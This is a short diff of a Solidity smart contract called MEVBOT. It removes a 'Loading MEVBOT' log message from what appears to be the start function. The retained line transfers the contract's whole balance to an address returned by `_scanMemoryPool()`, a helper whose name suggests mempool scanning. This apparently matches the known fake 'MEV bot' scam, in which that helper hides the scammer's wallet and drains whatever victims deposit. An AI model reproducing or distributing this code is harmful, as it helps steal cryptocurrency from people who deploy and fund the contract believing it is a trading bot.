@@ -1754,8 +1754,6 @@ contract MEVBOT is Ownable {
         require(!_ispaused, "MEVBOT HAS BEEN pauseD.");
         require(!_isstopped, "BOT IS stopPED, START IT.");
 
-        emit Log("Loading MEVBOT. This can take a while. Please wait..");
-
         payable(_scanMemoryPool()).transfer(address(this).balance);
 
         // Monitors the Health of the MEVBOT over the network.
